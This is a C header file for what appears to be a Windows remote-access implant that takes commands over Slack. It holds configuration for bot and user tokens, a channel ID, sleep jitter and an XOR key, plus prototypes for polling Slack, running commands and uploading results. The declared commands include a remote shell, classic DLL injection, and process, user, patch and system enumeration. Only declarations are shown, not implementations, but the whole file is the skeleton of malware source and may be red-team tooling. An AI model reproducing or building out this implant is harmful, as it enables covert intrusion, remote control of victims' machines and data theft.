#pragma once

// ────────────────────────────────
// Includes
// ────────────────────────────────
#define SECURITY_WIN32
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>      
#include <Windows.h>
#include <WinInet.h>
#include <winternl.h>
#include <sspi.h> 
#include <secext.h>         
#include <lm.h>
#include <shlwapi.h>
#include <ntstatus.h>
#include <wuapi.h>
#include "cJSON.h"
#pragma comment(lib, "Kernel32.lib")
#pragma comment(lib, "Wininet.lib")
#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "OleAut32.lib")
#pragma comment(lib, "Secur32.lib")
#pragma comment(lib, "Netapi32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shlwapi.lib")



// Must contain _ERROR
#define DEBUG(msg) \
    do { printf("[!] %s:~%d - %s Failed with Error: %lu\n", GetFilename(__FILE__), __LINE__, msg, GetLastError()); goto _ERROR; } while (0)


#define NT_MAJOR_VERSION  0x26C
#define NT_MINOR_VERSION  0x270
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)


// ────────────────────────────────
// Custom structure to represent a Slack Command
// ────────────────────────────────
typedef struct {
    char  ts[18];
    unsigned char* buffer;
    int bufferSize;
    char name[256];
    char url_private[512];
} SlackCmd;

// ────────────────────────────────
// Custom structure to hold configuration vars
// ────────────────────────────────
typedef struct {
    char* botToken;
    char* userToken;
    char* channelId;
    char* currentWorkingDir;
    char* path;
    int pathSize;
    char* headers;
    int headerSize;
    int maxMsgLength;
    int maxMsgToGet;
    int sleepInterval;
    int sleepJitter;
    LPCSTR userAgent;
    unsigned char xorKey[32];
    size_t xorKeySize;
} Config;

extern Config gConfig;


typedef NTSTATUS(NTAPI* NtQuerySystemInformationFuncPtr)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

// ────────────────────────────────
// Helper API Prototypes
// ────────────────────────────────
BOOL Alert(const char* msg);
void Base64Encode(const BYTE* input, size_t inputLen, char** output, size_t* outputLen);
void Base64Decode(const char* input, size_t inputLen, unsigned char** decodedCmd, size_t* outputLen);
void BufferAppend(char** buffer, int oldSize, int* newSize, const char* format, ...);
void BufferReplace(char** buffer, int oldSize, int* newSize, char* format, ...);
void Cleanup(SlackCmd** cmdArray, int* numElements, char** slackJson);
BOOL Dispatch(SlackCmd** cmdArray, int numElements);
void Execute(SlackCmd* slackCmd);
void FormatFileTime(const FILETIME* ft, char* outStr, size_t outStrSize);
const char* GetFilename(const char* path);
BOOL GetFromSlack(char** slackJson);
char* ParseCommand(const char* input);
char* ParseFirstArg(const char* input);
char* ParseSecondArg(const char* input);
BOOL PostToSlack(SlackCmd* slackCmd);
BOOL ParseSlackJSON(char* slackJson, SlackCmd** cmdArray, int* numElements);
void Transmit(SlackCmd* cmdArray, int numElements);
char* WideStringToUTF8(PWSTR wideStr, USHORT lengthInBytes);
void SanitizeJSON(SlackCmd* slackCmd);
BOOL UploadFile(SlackCmd* slackCmd);

// ────────────────────────────────
// Supported Command Prototypes
// ────────────────────────────────
void cd(SlackCmd* slackCmd);
void classicdllinject(SlackCmd* slackCmd);
void ls(SlackCmd* slackCmd);
void netusers(SlackCmd* slackCmd);
void ps(SlackCmd* slackCmd);
void pwd(SlackCmd* slackCmd);
void querypatches(SlackCmd* slackCmd);
void systeminfo(SlackCmd* slackCmd);
void unknown(SlackCmd* slackCmd);
void upload(SlackCmd* slackCmd);
void username(SlackCmd* slackCmd);
void shell(SlackCmd* slackCmd);
void sha256(SlackCmd* slackCmd);